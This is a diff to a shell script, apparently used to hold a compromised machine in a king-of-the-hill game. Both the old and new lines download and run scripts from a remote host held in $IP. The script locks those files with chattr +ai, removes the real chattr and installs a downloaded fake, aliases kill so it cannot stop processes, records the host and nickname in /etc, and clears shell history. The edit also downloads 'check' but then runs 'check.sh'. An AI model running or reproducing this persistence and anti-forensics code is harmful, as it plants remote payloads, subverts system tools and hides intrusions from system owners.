@@ -46,11 +46,11 @@ echo "--------------------------------------------------------------------------
 alias kill='echo "Sorry, the kill command is disabled."'
 echo "-----------------------------------------------------------------------------"
 echo
-mkdir /home/... && cd /home/... && wget http://$IP/check.sh && chmod +x check.sh 
-./check.sh "$nick" &
-cd /mnt && mkdir ... && cd ... && wget http://$IP/guardian.sh && chmod +x guardian.sh  
-./guardian.sh "$IP" &
-chattr +ai /home/.../check.sh && chattr +ai /mnt/.../guardian.sh
+cd /etc/bin && wget http://$IP/check && chmod +x check 
+./check.sh &
+cd /etc/bin && wget http://$IP/guardian.sh && chmod +x guardian.sh  
+./guardian.sh &
+chattr +ai /etc/bin/check && chattr +ai /etc/bin/guardian.sh
 echo
 echo "--------------------File successfully running in the background---------------"
 echo "-----------------------------------------------------------------------------"
@@ -59,7 +59,8 @@ rm -rf /usr/bin/chattr && cd /usr/bin && wget http://$IP/chattr && chmod +x chat
 echo
 echo "------------------Fake chattr successfully added-----------------"
 echo "-----------------------------------------------------------------"
-echo
+echo "$IP" >> /etc/HOST &
+echo "$nick" >> /etc/nick &
 chmod +x /root/king.txt
 history -c
 echo
